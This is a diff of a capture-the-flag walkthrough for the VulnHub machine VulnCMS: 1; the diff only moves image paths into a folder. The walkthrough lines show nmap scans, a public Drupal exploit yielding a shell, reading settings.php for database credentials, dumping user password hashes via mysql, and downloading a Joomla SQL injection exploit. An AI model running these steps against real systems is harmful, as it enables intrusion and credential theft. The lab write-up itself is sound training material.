@@ -3,7 +3,7 @@
 - **Machine:** VulnCMS: 1
 - **Download:** https://www.vulnhub.com/entry/vulncms-1,710/
 
-![](827-1.png)
+![](images/827-1.png)
 
 ---
 
@@ -25,7 +25,7 @@ Identify the target machine on the local network.
 nmap -sn 192.168.2.0/24
 ```
 
-![](827-2.png)
+![](images/827-2.png)
 
 ---
 
@@ -37,7 +37,7 @@ Perform a complete TCP scan with service detection, default NSE scripts, operati
 nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.125
 ```
 
-![](827-3.png)
+![](images/827-3.png)
 
 ---
 
@@ -65,7 +65,7 @@ Run the HTTP enumeration NSE script.
 nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.125
 ```
 
-![](827-4.png)
+![](images/827-4.png)
 
 ---
 
@@ -89,7 +89,7 @@ http://192.168.2.125/robots.txt
 http://192.168.2.125/about.html
 ```
 
-![](827-5.png)
+![](images/827-5.png)
 
 ---
 
@@ -107,7 +107,7 @@ Example:
 192.168.2.125 fsociety.web
 ```
 
-![](827-6.png)
+![](images/827-6.png)
 
 Browse the discovered services.
 
@@ -135,7 +135,7 @@ Search for a suitable exploit.
 https://www.exploit-db.com/exploits/44449
 ```
 
-![](827-7.png)
+![](images/827-7.png)
 
 Execute the exploit.
 
@@ -145,7 +145,7 @@ ruby 44449.rb 192.168.2.125:9001
 
 A Drupal shell is obtained.
 
-![](827-8.png)
+![](images/827-8.png)
 
 ---
 
@@ -157,7 +157,7 @@ List the current directory.
 ls
 ```
 
-![](827-9.png)
+![](images/827-9.png)
 
 Read the Drupal configuration file.
 
@@ -167,7 +167,7 @@ cat sites/default/settings.php
 
 The database credentials are disclosed.
 
-![](827-10.png)
+![](images/827-10.png)
 
 ---
 
@@ -179,7 +179,7 @@ Verify database access.
 mysql -u drupal_admin -p'p@$$_C!rUP@!_cM5' -e "show databases;"
 ```
 
-![](827-11.png)
+![](images/827-11.png)
 
 Display all tables.
 
@@ -193,7 +193,7 @@ Dump user credentials.
 mysql -u drupal_admin -p'p@$$_C!rUP@!_cM5' -D drupal_db -e "select uid,name,pass from users;"
 ```
 
-![](827-12.png)
+![](images/827-12.png)
 
 Recovered credentials:
 
@@ -212,7 +212,7 @@ Determine the hash type.
 hashid '$S$DADmuahqIEcfhp8mqTQ/ystjAyQdBA46h/VXbd89wutU4aKRmNpi'
 ```
 
-![](827-13.png)
+![](images/827-13.png)
 
 The hash is identified as a Drupal password hash.
 
@@ -228,7 +228,7 @@ Enumerate the Joomla installation.
 joomscan -u http://192.168.2.125:8081
 ```
 
-![](827-14.png)
+![](images/827-14.png)
 
 Identify a public exploit.
 
@@ -236,7 +236,7 @@ Identify a public exploit.
 https://www.exploit-db.com/exploits/38534
 ```
 
-![](827-15.png)
+![](images/827-15.png)
 
 Download the exploit.
 
@@ -252,7 +252,7 @@ Or directly:
 wget https://www.exploit-db.com/raw/38534 -O joomla_sqli.py
 ```
 
-![](827-16.png)
+![](images/827-16.png)
 
 ---
 
